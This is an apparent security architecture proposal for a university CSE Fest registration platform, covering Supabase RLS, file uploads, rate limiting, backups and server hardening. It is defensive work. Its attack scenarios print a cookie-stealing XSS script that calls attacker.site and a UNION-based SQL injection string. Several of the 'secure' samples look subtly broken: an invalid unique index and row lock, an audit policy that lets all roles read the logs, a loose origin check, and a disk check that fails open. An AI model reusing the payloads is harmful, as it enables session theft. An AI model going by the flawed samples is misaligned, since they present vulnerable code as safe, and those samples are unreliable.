# Security Implementation Plan — CSE Fest 2026

**Author**: Senior Application Security Architect & DevSecOps Engineer  
**Status**: Proposal  
**Target Date**: July 18, 2026  
**Scope**: Next.js 15 App, Supabase (Free Tier), Local Storage Submissions, Nginx Reverse Proxy on University-hosted Linux VM (direct IP/DNS binding, no Cloudflare proxy).

---

## 🎯 Executive Summary & Context

This security implementation plan details how to secure the **CSE Fest 2026 Management Platform** to handle **1,000 to 10,000 participants** securely on a **University-hosted Linux VM (50GB storage limit)** and a **Supabase Free Tier (500MB DB Limit)**.

### Database Constraints (500MB Free Tier for 10,000 Users)
To store up to 10,000 participant profiles, team tables, payment records, and submission meta-data without exceeding the **500MB Supabase PostgreSQL limit**, the database schemas must be highly optimized:
1. **No Large Text blobs or Base64 in PostgreSQL**: All documents, images, and screenshots must reside on local disk storage or Cloudinary. PostgreSQL should only hold metadata URLs and public IDs.
2. **Compact Audit Trails**: Audit logs should store primary keys and compact change-deltas rather than full row snapshots.
3. **Log Rotation/Pruning Triggers**: Implement automated PostgreSQL Cron jobs (`pg_cron`) or scheduled background workers to archive or prune transient records (e.g., read notifications, expired team invitations, password reset logs) older than 14 days.

### Server Storage Constraints (50GB Local Disk Limit)
With a hard limit of **50GB VM storage** for OS, Next.js build files, Node modules, databases (if any local cache), logs, and submission assets, we must prevent disk overflow:
1. **Dynamic File Limits**: Enforce strict size constraints dynamically by checking the MIME type of incoming uploads:
   - **PDF uploads** (proposals, rulebooks, student ID cards): Restricted to **5MB** maximum per file.
   - **Video submissions** (3-4 mins project/IoT showcases): Restricted to **200MB** maximum per file.
2. **Immediate Offsite Backups**: The server must not store backup archives locally. Scripted backups must be pushed offsite (e.g., via secure `scp`/`rsync`) and deleted from the local disk immediately.
3. **Log size management**: Configure aggressive log rotations (`pm2-logrotate` and Nginx `logrotate`) with size thresholds to prevent logs from inflating.

---

## 🔍 Threat Model (STRIDE)

| Threat | Vulnerability Source | Target Asset | Impact | Mitigation Strategy |
| :--- | :--- | :--- | :--- | :--- |
| **Spoofing** | Compromised user sessions / fake identities | Supabase Auth / OAuth | Unauthorized sign-ins, fake registrants | Enforce stateful CSRF verification in Google OAuth redirects and strict session token settings. |
| **Tampering** | API route payloads, raw database queries | Submissions, Team Roster, Scores | Manipulation of project scores, rulebook bypass | Supabase Row-Level Security (RLS) policies and Zod schema validations on input. |
| **Repudiation** | Missing action logs | Audit Logs, Payments | Administrators modifying scores or verifying payments without trace | Strict write-only audit logs in Supabase triggered by PostgreSQL database triggers. |
| **Information Leakage** | Publicly accessible student profiles, API data dumps | Participant PII, Student ID Images | Privacy breach (GDPR/Compliance failure), identity theft | Encrypted local uploads, restricted read permissions on `profiles` and ID metadata. |
| **Denial of Service** | Large file uploads, registration request spikes | University VM, Disk Storage | Platform crashes during registration window | Nginx rate limits, memory-limited streams, local file size constraints. |
| **Elevation of Privilege** | Self-updating profile roles (e.g. setting `role = 'admin'`) | User Roles / Supabase Profiles | Complete system takeover | Remove `role` updates from the client profile API, using server-side secure claims or DB triggers. |

---

## 🛡️ 1. Authentication Security

### Risk
Session hijacking, man-in-the-middle (MITM) credential interception, or OAuth authorization code interception.

### Attack Scenario
An attacker intercepts an unencrypted HTTP OAuth callback, extracts the authentication code, and logs into a participant's account to steal personal information or register fake teams.

### Recommended Mitigation
1. **Enforce SSL/TLS**: Force HTTPS on the OAuth redirect URI (`https://csefest.smuct.edu.bd/auth/callback`).
2. **Secure Session Cookies**: Force `HttpOnly`, `Secure`, and `SameSite=Lax` cookies for Next.js session storage.
3. **Google OAuth State Validation**: NextJS Middleware + Supabase Auth helpers must validate the cryptographic `state` parameter on OAuth redirects to prevent session-fixation attacks.

### Example Configuration (Next.js Middleware `/src/middleware.ts`)
```typescript
import { createServerClient } from "@supabase/ssr";
import { NextResponse, type NextRequest } from "next/server";

export async function middleware(request: NextRequest) {
  let response = NextResponse.next({
    request: {
      headers: request.headers,
    },
  });

  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    {
      cookies: {
        getAll() {
          return request.cookies.getAll();
        },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value, options }) => {
            request.cookies.set(name, value);
            response.cookies.set(name, value, {
              ...options,
              httpOnly: true,
              secure: process.env.NODE_ENV === "production",
              sameSite: "lax",
            });
          });
        },
      },
    }
  );

  // Authenticate request
  const { data: { user } } = await supabase.auth.getUser();

  // Protect admin routes
  if (request.nextUrl.pathname.startsWith("/admin") && user?.user_metadata?.role !== "admin") {
    return NextResponse.redirect(new URL("/login", request.url));
  }

  return response;
}
```

* **Priority**: **Critical**

---

## 🔐 2. Authorization & Supabase RLS Policies

### Risk
Unauthorized users reading, inserting, or modifying databases belonging to other teams, participants, or administrative actions.

### Attack Scenario
A participant makes a direct API fetch call changing their `team_id` or altering scores entered for their team, bypassing client-side validation rules.

### Recommended Mitigation
Enable Row Level Security (RLS) on all PostgreSQL tables. Use policy definitions tied to the authenticated user's ID (`auth.uid()`).

### Example Configuration (PostgreSQL Migration `/supabase/migrations/rls_policies.sql`)
```sql
-- Enable RLS on core tables
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE teams ENABLE ROW LEVEL SECURITY;
ALTER TABLE team_members ENABLE ROW LEVEL SECURITY;
ALTER TABLE submissions ENABLE ROW LEVEL SECURITY;

-- 1. Profiles: Users can read and update only their own profile. Admins can read all.
CREATE POLICY "Users can manage own profile" ON profiles
  FOR ALL
  USING (auth.uid() = id)
  WITH CHECK (auth.uid() = id);

CREATE POLICY "Admins can read all profiles" ON profiles
  FOR SELECT
  USING (
    EXISTS (
      SELECT 1 FROM users
      WHERE users.id = auth.uid() AND users.role = 'admin'
    )
  );

-- 2. Submissions: Only team members can read/write submissions during the submission window.
CREATE POLICY "Team members can manage own submissions" ON submissions
  FOR ALL
  USING (
    EXISTS (
      SELECT 1 FROM team_members
      WHERE team_members.team_id = submissions.team_id 
        AND team_members.user_id = auth.uid()
    )
  )
  WITH CHECK (
    EXISTS (
      SELECT 1 FROM team_members
      WHERE team_members.team_id = submissions.team_id 
        AND team_members.user_id = auth.uid()
    )
    AND EXISTS (
      SELECT 1 FROM competitions
      WHERE competitions.id = submissions.competition_id
        AND now() BETWEEN competitions.submission_start AND competitions.submission_end
    )
  );
```

* **Priority**: **Critical**

---

## 🚫 3. Protection Against Privilege Escalation

### Risk
Participants escalating their authorization levels to `admin` through manipulated payload fields, cookie tampering, or database record overrides.

### Attack Scenario
A user triggers a profile-update request sending JSON parameter `role: "admin"` which updates their profile role flag, giving them dashboard administration rights.

### Recommended Mitigation
1. **Server-Side Role Separation**: Never allow updating the user role via public profile update API routes.
2. **Triggers/Function Checks**: Protect user role assignment through Postgres database triggers, preventing updates to critical columns except by service role permissions.

### Example Configuration (PostgreSQL Triggers `/supabase/migrations/restrict_roles.sql`)
```sql
-- Trigger function to prevent profiles role manipulation
CREATE OR REPLACE FUNCTION check_profile_role_immutable()
RETURNS TRIGGER AS $$
BEGIN
  -- If user tries to change the role column
  IF NEW.role <> OLD.role AND auth.role() = 'authenticated' THEN
    -- Block transaction if executed by normal authenticated user
    RAISE EXCEPTION 'Privilege escalation attempt blocked: users cannot change their own role.';
  END IF;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE TRIGGER tr_check_profile_role
BEFORE UPDATE ON profiles
FOR EACH ROW
EXECUTE FUNCTION check_profile_role_immutable();
```

* **Priority**: **Critical**

---

## 🛡️ 4. Prevention of IDOR Vulnerabilities (Insecure Direct Object Reference)

### Risk
Exposure of internal record IDs allows users to change URLs or API payloads (e.g. replacing `team_id=45` with `team_id=46`) to read or alter files and records.

### Attack Scenario
An attacker queries `/api/submissions?team_id=123` to view another team's private project brief or code repository links, simply by incrementing integers.

### Recommended Mitigation
1. **UUIDv4**: Use randomly generated UUIDv4 keys instead of sequential integers for all primary keys in user tables, teams, submissions, and payments.
2. **Context Validation**: Always check that `auth.uid()` belongs to the resource context on the server side (e.g., verifying membership in the team before returning submission details).

### Example Configuration (NextJS Server API `/src/app/api/submissions/route.ts`)
```typescript
import { createRouteHandlerClient } from "@supabase/ssr";
import { cookies } from "next/headers";
import { NextResponse } from "next/server";
import { z } from "zod";

const requestSchema = z.object({
  submissionId: z.string().uuid("Invalid submission identifier"),
});

export async function POST(req: Request) {
  const cookieStore = await cookies();
  const supabase = createRouteHandlerClient({ cookies: () => cookieStore });

  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return NextResponse.json({ success: false, message: "Unauthorized" }, { status: 401 });

  const body = await req.json();
  const parsed = requestSchema.safeParse(body);
  if (!parsed.success) return NextResponse.json({ success: false, message: parsed.error.message }, { status: 400 });

  // Explicitly verify the authenticated user belongs to the team of this submission
  const { data: submission, error } = await supabase
    .from("submissions")
    .select("*, teams!inner(id, leader_id, team_members(user_id))")
    .eq("id", parsed.data.submissionId)
    .single();

  if (error || !submission) {
    return NextResponse.json({ success: false, message: "Submission not found" }, { status: 404 });
  }

  const isMember = submission.teams.team_members.some((m: { user_id: string }) => m.user_id === user.id);
  if (!isMember && user.user_metadata?.role !== "admin") {
    return NextResponse.json({ success: false, message: "Forbidden: Not your submission" }, { status: 403 });
  }

  return NextResponse.json({ success: true, data: submission });
}
```

* **Priority**: **High**

---

## 🔒 5. Prevention of PII Leakage (Personally Identifiable Information)

### Risk
Exposure of full names, phone numbers, student ID card scans, and academic emails to other participants or unauthenticated web crawlers.

### Attack Scenario
A participant queries a public search API on the site that accidentally returns the complete profile JSON (including phone numbers, gender, and student ID verification URLs) of another participant.

### Recommended Mitigation
1. **Select Column Whitelisting**: Never write `SELECT *` in client queries. Force distinct select statements filtering out sensitive columns.
2. **Masked Public Views**: Create separate read-only views for public leaderboards/rankings that exclude email and phone numbers.
3. **Private Buckets**: Student ID image assets must not be stored in public buckets. Ensure access triggers a short-lived signed URL generated server-side.

### Example Configuration (PostgreSQL Masked View `/supabase/migrations/public_rankings.sql`)
```sql
-- Create a public rankings view showing only essential public data
CREATE OR REPLACE VIEW public_leaderboard AS
SELECT 
  r.rank_position,
  t.name as team_name,
  c.name as competition_name,
  r.total_score
FROM rankings r
JOIN teams t ON r.team_id = t.id
JOIN competitions c ON r.competition_id = c.id
WHERE r.is_public = true
ORDER BY r.rank_position ASC;

-- Grant select access only to public read-only views
GRANT SELECT ON public_leaderboard TO anon, authenticated;
```

* **Priority**: **High**

---

## 🚦 6. Database Constraints & Race Condition Mitigation

### Risk
Double registrations, users joining multiple teams for the same competition, or team sizes exceeding maximum limits due to rapid concurrent requests (race conditions).

### Attack Scenario
During a high-concurrency registration hour, two members click "Join Team" simultaneously on a team of size `max_members = 3` that currently has 2 members. Both requests verify the size count of 2 and succeed, resulting in a team size of 4.

### Recommended Mitigation
1. **Database Unique Constraints**: Prevent a user from having more than one team per competition by implementing a database unique index.
2. **PostgreSQL Transactions & Row Locking**: Perform updates within a strict transaction block using `SELECT ... FOR UPDATE` to lock rows until verification checks and insertions complete.

### Example Configuration (PostgreSQL Transactional Function `/supabase/migrations/team_enrollment.sql`)
```sql
-- Unique index to prevent joining multiple teams in same competition
CREATE UNIQUE INDEX idx_user_competition_limit 
ON team_members (user_id, (SELECT competition_id FROM teams WHERE id = team_id));

-- Function to handle team joins safely under concurrent load
CREATE OR REPLACE FUNCTION join_team_safely(p_team_id UUID, p_user_id UUID)
RETURNS BOOLEAN AS $$
DECLARE
  v_current_count INTEGER;
  v_max_members INTEGER;
BEGIN
  -- Obtain exclusive row lock on the team record to block race conditions
  SELECT max_members INTO v_max_members
  FROM competitions
  WHERE id = (SELECT competition_id FROM teams WHERE id = p_team_id FOR SHARE);

  -- Count existing members with write-lock
  SELECT COUNT(*) INTO v_current_count
  FROM team_members
  WHERE team_id = p_team_id FOR UPDATE;

  IF v_current_count >= v_max_members THEN
    RAISE EXCEPTION 'Registration failed: This team is already full.';
  END IF;

  -- Proceed with insertion
  INSERT INTO team_members (team_id, user_id, role, invitation_status, joined_at)
  VALUES (p_team_id, p_user_id, 'member', 'accepted', now());

  RETURN TRUE;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

* **Priority**: **High**

---

## 🛡️ 7. API Security

### Risk
Malformed inputs crashing server processes, exhausting DB resources, or executing payloads.

### Attack Scenario
An attacker sends a payload with an array containing 10,000 strings to an invite email field, exhausting Next.js server memory during processing.

### Recommended Mitigation
1. **Schema Validation**: Validate every endpoint request using `zod`.
2. **Payload Size Limit**: Limit raw request payloads at Nginx level and NextJS endpoint level.
3. **Structured Errors**: Avoid leaking stack traces; return generic, secure JSON errors.

### Example Configuration (Next.js Endpoint Validation `/src/app/api/profile/route.ts`)
```typescript
import { NextResponse } from "next/server";
import { z } from "zod";

const profileSchema = z.object({
  fullName: z.string().min(3).max(64).regex(/^[a-zA-Z\s]*$/, "Only letters and spaces allowed"),
  phone: z.string().regex(/^\+?[0-9]{11,14}$/, "Invalid phone format"),
  github: z.string().url().optional().or(z.literal("")),
  tshirtSize: z.enum(["S", "M", "L", "XL", "XXL"]),
});

export async function POST(req: Request) {
  try {
    const rawBody = await req.json();
    const result = profileSchema.safeParse(rawBody);

    if (!result.success) {
      return NextResponse.json({
        success: false,
        message: "Validation failed",
        errors: result.error.flatten().fieldErrors
      }, { status: 400 });
    }

    // Process valid data safely
    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ success: false, message: "Invalid request payload" }, { status: 400 });
  }
}
```

* **Priority**: **High**

---

## 💉 8. SQL Injection Prevention

### Risk
Attackers injecting malicious SQL commands into input fields to bypass auth, extract the database, or drop tables.

### Attack Scenario
A public search input field dynamically appends data: `db.execute("SELECT * FROM FAQ WHERE question LIKE '%" + input + "%'")`. An attacker inputs `' UNION SELECT * FROM users --` to dump client passwords.

### Recommended Mitigation
1. **Query Builder / ORM**: Use the Supabase client library exclusively for database querying. It uses parameterized requests internally via PostgREST.
2. **Parameterized Raw Queries**: If raw SQL is required inside database functions, use PostgreSQL placeholders (`$1`, `$2`) or dynamic SQL utilizing `format()` with `%I` (identities) and `%L` (literals).

### Example Configuration (Safe dynamic function query `/supabase/migrations/dynamic_search.sql`)
```sql
CREATE OR REPLACE FUNCTION get_faqs_safe(p_search_query TEXT)
RETURNS SETOF faqs AS $$
BEGIN
  -- Safe parameterized execute using query variables
  RETURN QUERY
  SELECT * FROM faqs
  WHERE question ILIKE '%' || p_search_query || '%'
    AND visible = true;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

* **Priority**: **Critical**

---

## 🧼 9. XSS Prevention (Cross-Site Scripting)

### Risk
Injecting malicious HTML or Javascript tags into input fields (e.g. bio, name) that execute in the browser of other users (like admins reviewing registrations).

### Attack Scenario
An attacker updates their biography to `<script>fetch('https://attacker.site/steal?cookie='+document.cookie)</script>`. When an Admin views the participant's verification dashboard, the script executes, sending admin cookies to the attacker.

### Recommended Mitigation
1. **Automatic Escaping**: React automatically escapes rendering variables within JSX, neutralizing raw scripts.
2. **Strict Sanitization**: If using rich text (rendering raw HTML via `dangerouslySetInnerHTML`), apply a server-side parser library like `dompurify` and `isomorphic-dompurify`.
3. **CSP Whitelisting**: Disable inline scripts using NextJS headers.

### Example Configuration (Safe Rich Text Rendering component `/src/components/shared/SanitizedText.tsx`)
```tsx
import DOMPurify from "isomorphic-dompurify";

interface SanitizedTextProps {
  htmlContent: string;
}

export function SanitizedText({ htmlContent }: SanitizedTextProps) {
  // Purify incoming markup before injection
  const safeHTML = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"],
    ALLOWED_ATTR: ["href", "target", "rel"],
  });

  return <div dangerouslySetInnerHTML={{ __html: safeHTML }} className="text-body" />;
}
```

* **Priority**: **High**

---

## 🔑 10. CSRF Protection (Cross-Site Request Forgery)

### Risk
Attackers tricking authenticated users into executing state-changing API commands on the platform without their knowledge.

### Attack Scenario
An attacker sends a link pointing to an image source link: `<img src="https://csefest.smuct.edu.bd/api/teams/leave?team_id=123" />`. When an authenticated team leader visits the page, their browser automatically triggers the authenticated team-leave API route.

### Recommended Mitigation
1. **Next.js Router Check**: Next.js route handlers verify the `Origin` and `Referer` headers against the host domain.
2. **SameSite Cookie Contexts**: Enforce `SameSite=Lax` or `SameSite=Strict` on session cookies, restricting third-party request cookie delivery.

### Example Configuration (Global API Middleware Referer Check `/src/app/api/middleware.ts`)
```typescript
import { NextResponse, type NextRequest } from "next/server";

export function verifyCSRF(request: NextRequest) {
  if (["POST", "PUT", "DELETE", "PATCH"].includes(request.method)) {
    const origin = request.headers.get("origin");
    const host = request.headers.get("host");

    if (!origin || !origin.includes(host || "")) {
      return new NextResponse(
        JSON.stringify({ success: false, message: "CSRF verification failed: invalid origin source" }),
        { status: 403, headers: { "Content-Type": "application/json" } }
      );
    }
  }
  return null;
}
```

* **Priority**: **High**

---

## 📂 11. Secure File Upload Architecture

### Risk
Upload of arbitrary executable scripts (e.g., `.php`, `.sh`, `.exe`) that could compromise the host server, or malicious files executing script context on direct access.

### Attack Scenario
An attacker uploads a file named `shell.php` to the submission page. Since the backend persists the file directly to `/var/www/cse-fest/storage`, they execute it by directly navigating to `https://csefest.smuct.edu.bd/storage/submissions/shell.php` to obtain a shell.

### Recommended Mitigation
1. **Storage Isolation**: Store uploaded files in a folder *completely outside* the web server's direct execution path.
2. **Path Sanitization**: Strip directory traversal sequences (`../`) from target filenames.
3. **MIME/Magic Number Check**: Do not trust file extensions; verify file structure signatures (magic numbers) on upload.
4. **Proxy Download Routes**: Serve uploads via dynamic API endpoints using stream proxies, instead of directly exposing static links.

### Example Configuration (Next.js Secure Local File Storage API `/src/app/api/submissions/upload/route.ts`)
```typescript
import { promises as fs } from "fs";
import { fileTypeFromBuffer } from "file-type"; // Requires package: file-type
import { NextResponse } from "next/server";
import path from "path";
import crypto from "crypto";

const ALLOWED_MIMES = ["application/pdf", "image/jpeg", "image/png", "video/mp4"];
const SECURE_STORAGE_PATH = "/var/www/cse-fest/storage-isolated/submissions";

// Define dynamic size limits
const LIMITS: Record<string, number> = {
  "application/pdf": 5 * 1024 * 1024,      // 5MB PDF maximum
  "image/jpeg": 5 * 1024 * 1024,           // 5MB images
  "image/png": 5 * 1024 * 1024,            // 5MB images
  "video/mp4": 200 * 1024 * 1024,          // 200MB video maximum (3-4 mins showcase)
};

import { checkDiskSpace } from "@/lib/exhaustionGuard";

export async function POST(req: Request) {
  try {
    // 1. Enforce Disk Exhaustion Guard: Reject if server has less than 5GB free space
    const isDiskSpaceAvailable = await checkDiskSpace();
    if (!isDiskSpaceAvailable) {
      return NextResponse.json({ 
        success: false, 
        message: "Upload blocked: Server storage capacity reached. Please contact support." 
      }, { status: 507 }); // HTTP 507 Insufficient Storage
    }

    const formData = await req.formData();
    const file = formData.get("file") as File | null;
    if (!file) return NextResponse.json({ success: false, message: "No file provided" }, { status: 400 });

    const buffer = Buffer.from(await file.arrayBuffer());

    // Validate actual file type using magic numbers
    const detectedType = await fileTypeFromBuffer(buffer);
    if (!detectedType || !ALLOWED_MIMES.includes(detectedType.mime)) {
      return NextResponse.json({ success: false, message: "File format is not allowed" }, { status: 400 });
    }

    // Dynamic size check based on file format
    const maxAllowedSize = LIMITS[detectedType.mime] || (5 * 1024 * 1024); // Default to 5MB
    if (file.size > maxAllowedSize) {
      const displaySize = maxAllowedSize / (1024 * 1024);
      return NextResponse.json({ 
        success: false, 
        message: `File exceeds the allowed size limit of ${displaySize}MB for this file type` 
      }, { status: 400 });
    }

    // Generate random secure filename to prevent enumeration
    const fileHash = crypto.randomBytes(16).toString("hex");
    const sanitizedExt = path.extname(file.name).replace(/[^a-zA-Z0-9.]/g, "");
    const secureFilename = `${fileHash}${sanitizedExt}`;
    const destination = path.join(SECURE_STORAGE_PATH, secureFilename);

    // Write file directly to isolated storage path
    await fs.mkdir(SECURE_STORAGE_PATH, { recursive: true });
    await fs.writeFile(destination, buffer);

    return NextResponse.json({ success: true, fileUrl: `/api/submissions/download?id=${fileHash}` });
  } catch (error) {
    return NextResponse.json({ success: false, message: "Internal server upload failure" }, { status: 500 });
  }
}
```

* **Priority**: **Critical**

## 📂 12. Upload Disk Exhaustion Guard & Cleanup Policies

### Risk
Attackers or bugs repeatedly uploading 200MB videos or 5MB PDFs to exhaust the VM's strict 50GB storage space, causing database writes to fail and crashing the entire server.

### Attack Scenario
An attacker runs a script that calls the upload API repeatedly in a loop with random 200MB video payloads. Within 150 requests, the server's disk space hits 100% capacity, causing Nginx and PM2 processes to fail and blocking all genuine teams from registering.

### Recommended Mitigation
1. **Dynamic Disk Safeguard Check**: Implement an automated disk check using standard Linux command utilities (`df`) inside the Next.js API route before writing file streams to the local disk. Reject uploads if available space falls below **5 GB**.
2. **Immediate Orphan Cleanup**: If a team uploads a new version of a proposal or video, delete the previous file from the local filesystem immediately instead of keeping orphaned versions on disk.
3. **Strict Upload Constraints**: Force limits on the maximum files a team can store (e.g., exactly 1 video file and 1 PDF file maximum per team).

### Example Configuration (Upload Exhaustion Guard & Cleaner `/src/lib/exhaustionGuard.ts`)
```typescript
import { exec } from "child_process";
import { promises as fs } from "fs";
import { NextResponse } from "next/server";

const MIN_FREE_DISK_GB = 5; // Reserve at least 5GB for OS stability

/**
 * Check VM remaining disk space using standard Linux df command
 */
export function checkDiskSpace(): Promise<boolean> {
  return new Promise((resolve) => {
    // Run df command on the root directory
    exec("df -BG /", (err, stdout) => {
      if (err || !stdout) {
        // Fallback to allow if command fails (or log warning)
        return resolve(true);
      }
      
      const lines = stdout.trim().split("\n");
      if (lines.length < 2) return resolve(true);
      
      // Parse columns of the root partition
      const cols = lines[1].split(/\s+/);
      const availableGB = parseInt(cols[3].replace("G", ""), 10);
      
      if (isNaN(availableGB)) return resolve(true);
      
      // Allow upload only if remaining space is above safety threshold
      resolve(availableGB > MIN_FREE_DISK_GB);
    });
  });
}

/**
 * Delete previous submission file to prevent storage inflation
 */
export async function deletePreviousFile(absolutePath: string): Promise<void> {
  try {
    const exists = await fs.access(absolutePath).then(() => true).catch(() => false);
    if (exists) {
      await fs.unlink(absolutePath);
    }
  } catch (error) {
    // Fail silently or log to avoid breaking upload stream on deletion errors
  }
}
```

* **Priority**: **Critical**

---

## 🚦 13. Rate Limiting Strategy (Nginx & Next.js)

### Risk
Brute-force profile registrations, submission flooding, or API abuse degrading application performance.

### Attack Scenario
A script registers 5,000 blank profiles per minute, saturating the database connection pool and exhausting memory.

### Recommended Mitigation
1. **Nginx Limit Zones**: Configure high-level HTTP rate limiting in Nginx for all API paths.
2. **Specialized Limits**: Apply strict limits on authentication, registration, and file upload endpoints.

### Example Configuration (Nginx Configuration `/etc/nginx/nginx.conf`)
```nginx
http {
    # Define shared memory zone for generic rate limiting (10MB zones keep ~160k tracking items)
    limit_req_zone $binary_remote_addr zone=global_limit:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=auth_limit:10m rate=3r/m;
    limit_req_zone $binary_remote_addr zone=upload_limit:10m rate=5r/m;

    server {
        listen 443 ssl;
        server_name csefest.smuct.edu.bd;

        # Global rate limit
        limit_req zone=global_limit burst=20 nodelay;

        # Rate limit authentication & registration
        location /api/auth/ {
            limit_req zone=auth_limit burst=5;
            proxy_pass http://localhost:3000;
        }

        # Rate limit large uploads
        location /api/submissions/upload {
            limit_req zone=upload_limit burst=2;
            proxy_pass http://localhost:3000;
        }

        location / {
            proxy_pass http://localhost:3000;
        }
    }
}
```

* **Priority**: **High**

---

## 🛡️ 14. DDoS Protection (Nginx & VM Firewall)

### Risk
Intentional traffic flooding to make the server unreachable during the final hours of competition registrations.

### Attack Scenario
An attacker targets the university VM IP with a HTTP flood attack, filling Nginx queues and locking CPU cores, rendering the site unusable.

### Recommended Mitigation
1. **Configure Nginx Timeouts**: Force tight client header/body timeouts to drop slow HTTP connections.
2. **Fail2ban Integration**: Automatically analyze Nginx error logs to drop attacker IPs via the VM's local iptables firewall.
3. **VM Sysctl Hardening**: Optimize VM system network parameters against SYN flood attacks.

### Example Configuration (Fail2ban Filter `/etc/fail2ban/jail.local`)
```ini
[nginx-req-limit]
enabled  = true
port     = http,https
filter   = nginx-limit-req
logpath  = /var/log/nginx/error.log
maxretry = 5
findtime = 600
bantime  = 3600
action   = iptables-multiport[name=ReqLimit, port="http,https"]
```

And update sysctl settings (`/etc/sysctl.conf`):
```ini
# Prevent SYN floods
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 2048
net.ipv4.tcp_synack_retries = 2
```

* **Priority**: **High**

---

## 📝 15. Logging & Audit Trails

### Risk
Admins modifying team points or payments without logs, making it impossible to detect internal collusion or unauthorized changes.

### Attack Scenario
An organizer manually changes a team's score to place them first. Since there's no log trail, the manipulation goes unnoticed.

### Recommended Mitigation
1. **Write-Only Audit Log Table**: Prevent profile updates to the `audit_logs` table by participants or admins.
2. **Trigger-Based Logging**: Use database-level audit triggers to track deletions, updates, and score entries.
3. **Database Footprint Optimization**: Audit logs should store only IDs and changed field fields to save space.

### Example Configuration (PostgreSQL Audit Trigger `/supabase/migrations/audit.sql`)
```sql
-- Audit table
CREATE TABLE audit_logs (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    admin_id UUID REFERENCES auth.users(id),
    action VARCHAR(64) NOT NULL,
    resource_type VARCHAR(64) NOT NULL,
    resource_id UUID NOT NULL,
    changes JSONB,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now())
);

-- Deny all modifications/deletions on audit log for all roles
ALTER TABLE audit_logs ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Audit logs are write-only" ON audit_logs FOR SELECT USING (true);
CREATE POLICY "Audit inserts handled by system triggers" ON audit_logs FOR INSERT WITH CHECK (true);

-- Trigger function for score audit log
CREATE OR REPLACE FUNCTION audit_score_changes()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO audit_logs (admin_id, action, resource_type, resource_id, changes)
  VALUES (
    auth.uid(),
    TG_OP,
    'scores',
    COALESCE(NEW.id, OLD.id),
    jsonb_build_object(
      'previous_score', COALESCE(OLD.score, 0),
      'new_score', COALESCE(NEW.score, 0),
      'criteria', COALESCE(NEW.criteria_name, OLD.criteria_name)
    )
  );
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE TRIGGER tr_audit_score_mutation
AFTER INSERT OR UPDATE OR DELETE ON scores
FOR EACH ROW
EXECUTE FUNCTION audit_score_changes();
```

* **Priority**: **High**

---

## 💾 16. Backup & Disaster Recovery

### Risk
Hardware failures or database corruption causing permanent loss of team registrations, payment proofs, and project files.

### Attack Scenario
A disk failure on the university VM corrupts the local submissions folder and database files, losing 1,500 registrants' uploaded documents.

### Recommended Mitigation
1. **Daily Subsupabase Database Dumps**: Script a daily schema and data export using `pg_dump` and push encrypted versions to secure offline backups.
2. **Isolated Submission Mirrors**: Sync local submissions (`/var/www/cse-fest/storage/submissions`) daily to an external secure backup server using `rsync` over SSH.

### Example Configuration (Backup Automation Script `/scripts/backup.sh`)
```bash
#!/bin/bash
# Backup parameters
BACKUP_DIR="/var/www/cse-fest/backups"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
DB_BACKUP_FILE="${BACKUP_DIR}/supabase_backup_${TIMESTAMP}.sql"
SUBMISSION_BACKUP_FILE="${BACKUP_DIR}/submissions_${TIMESTAMP}.tar.gz"

mkdir -p "$BACKUP_DIR"

# Dump Supabase Database (Using connection parameters)
pg_dump "postgresql://postgres:${DB_PASSWORD}@${DB_HOST}:${DB_PORT}/${DB_NAME}" \
  -F c -b -v -f "$DB_BACKUP_FILE"

# Package submissions folder
tar -czf "$SUBMISSION_BACKUP_FILE" -C /var/www/cse-fest/storage submissions

# Encrypt backups using gpg key
gpg --encrypt --recipient admin@smuct.edu.bd "$DB_BACKUP_FILE"
gpg --encrypt --recipient admin@smuct.edu.bd "$SUBMISSION_BACKUP_FILE"

# Clean up unencrypted versions
rm "$DB_BACKUP_FILE"
rm "$SUBMISSION_BACKUP_FILE"

# Transmit encrypted files to offsite secure backup repository immediately (due to strict 50GB local server limit)
scp "${DB_BACKUP_FILE}.gpg" "${SUBMISSION_BACKUP_FILE}.gpg" backup-user@backup-host.smuct.edu.bd:/var/backups/cse-fest/

# Verify upload, then immediately remove encrypted local files to keep disk usage near zero
if [ $? -eq 0 ]; then
  rm "${DB_BACKUP_FILE}.gpg"
  rm "${SUBMISSION_BACKUP_FILE}.gpg"
else
  # Alert admin of failed backup transfer
  curl -X POST -H "Content-Type: application/json" -d '{"content": "🚨 ALERT: Offsite backup transfer failed!"}' https://discord.com/api/webhooks/your-alert-webhook
fi
```

* **Priority**: **High**

---

## 🔒 17. Server Hardening

### Risk
Attackers exploiting ssh credentials or unpatched operating system packages to gain root access.

### Attack Scenario
An attacker runs brute-force automated login scans against Port 22, cracking an administrator's weak SSH password and gaining control of the VM.

### Recommended Mitigation
1. **Key-Based SSH Auth**: Disable password logins entirely; enforce SSH key authentication.
2. **Change SSH Port**: Move SSH from Port 22 to a non-standard port (e.g., Port 2222).
3. **UFW Firewall Rules**: Configure local firewall policies to block all connections except ports 80, 443, and 2222.
4. **Auto Security Patches**: Set up automated Linux security updates.

### Example Configuration (SSH Hardening `/etc/ssh/sshd_config`)
```ini
Port 2222
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
X11Forwarding no
```

Local Firewall Setup (PowerShell command context, executed inside Linux VM):
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 2222/tcp
sudo ufw enable
